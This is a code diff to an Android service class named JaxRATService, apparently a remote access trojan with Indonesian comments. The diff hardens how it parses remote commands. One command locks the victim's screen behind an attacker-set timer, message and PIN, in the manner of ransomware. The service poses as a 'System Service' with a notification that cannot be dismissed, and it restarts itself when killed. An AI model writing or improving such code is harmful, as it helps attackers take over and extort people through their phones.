@@ -100,14 +100,16 @@ public class JaxRATService extends Service {
             String[] parts = cmd.split("\\|");
             if (parts.length >= 7) {
                 Intent intent = new Intent(this, LockScreenActivity.class);
-                intent.putExtra("TIMER", Long.parseLong(parts[1]));
-                intent.putExtra("PESAN", parts[5]);
-                intent.putExtra("PIN", parts[6]);
+                // .trim() biar aman dari spasi tak kasat mata
+                intent.putExtra("TIMER", Long.parseLong(parts[1].trim()));
+                intent.putExtra("PESAN", parts[5].trim());
+                intent.putExtra("PIN", parts[6].trim());
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             }
         } else if (cmd.equals("unpin_screen")) {
             Intent intent = new Intent("UNLOCK_SCREEN_ACTION");
+            intent.setPackage(getPackageName()); // KUNCI UTAMA: Bikin broadcast eksplisit
             sendBroadcast(intent);
         }
     }
@@ -155,7 +157,7 @@ public class JaxRATService extends Service {
                 .setContentTitle("System Service")
                 .setContentText("Menjalankan layanan sistem...")
                 .setSmallIcon(android.R.drawable.ic_menu_compass)
-                .setOngoing(true) // Bikin notifikasi gak bisa di-swipe
+                .setOngoing(true) 
                 .build();
     }
 
@@ -164,7 +166,6 @@ public class JaxRATService extends Service {
         return START_STICKY; 
     }
 
-    // --- JURUS BANGKIT KEMBALI KALAU DI-SWIPE ---
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
